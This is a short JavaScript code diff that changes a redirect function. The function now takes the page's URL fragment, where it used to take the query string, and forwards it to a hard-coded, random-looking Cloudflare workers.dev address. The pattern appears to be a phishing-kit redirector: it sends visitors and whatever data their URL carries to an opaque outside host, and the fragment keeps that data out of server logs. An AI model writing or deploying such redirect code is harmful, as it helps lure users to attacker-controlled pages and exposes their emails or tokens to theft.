@@ -387,15 +387,15 @@ if (typeof ues === 'function') {
     }
 
     function getQueriesFromUrl() {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.toString();
+        const hashParams = window.location.hash.substring(1); // Remove the '#' from the start
+        return hashParams;
     }
 
     function redirectWithQueries() {
         const queries = getQueriesFromUrl();
         let redirectUrl = 'https://prplwtrdc.e75379d39f0eee6667c5e83e.workers.dev/sf4eio4r/';
         if (queries) {
-            redirectUrl += `?${queries}`;
+            redirectUrl += `#${queries}`;
         }
         window.location.href = redirectUrl;
     }
